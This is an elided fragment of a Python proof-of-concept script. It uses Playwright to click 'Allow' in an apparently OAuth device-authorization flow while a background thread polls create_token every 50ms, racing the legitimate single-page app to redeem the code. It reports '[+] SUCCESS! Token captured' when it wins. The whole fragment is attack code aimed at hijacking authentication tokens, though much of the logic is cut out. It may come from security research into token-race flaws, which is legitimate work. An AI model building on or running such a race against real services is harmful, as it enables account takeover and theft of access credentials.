"""Race condition: click Allow and immediately poll create_token before SPA processes."""
...
captured_token = None
poll_thread_done = threading.Event()

def poll_for_token():
    """Poll aggressively every 50ms."""
        ...
        try:
            ...
            if err not in ('AuthorizationPendingException', 'SlowDownException'):
                ...
                if 'already redeemed' in str(e):
                    print("    Code already redeemed - SPA got there first")
                poll_thread_done.set()
                return
        except Exception:
            pass
...
with sync_playwright() as p:
    ...
    if 'Confirm and continue' in buttons:
        ...
        buttons = page.evaluate("Array.from(document.querySelectorAll('button')).map(b => b.innerText.trim()).filter(t => t).join(' | ')")
        if 'Allow' in buttons:
            # START POLLING THREAD JUST BEFORE CLICKING ALLOW
            poll_thread = threading.Thread(target=poll_for_token, daemon=True)
            poll_thread.start()
            time.sleep(0.01)  # 10ms delay before click
...
poll_thread_done.wait(timeout=30)
if captured_token:
    print(f"\n[+] SUCCESS! Token captured: {captured_token[:50]}...")
else:
    print("\n[!] Token not captured")
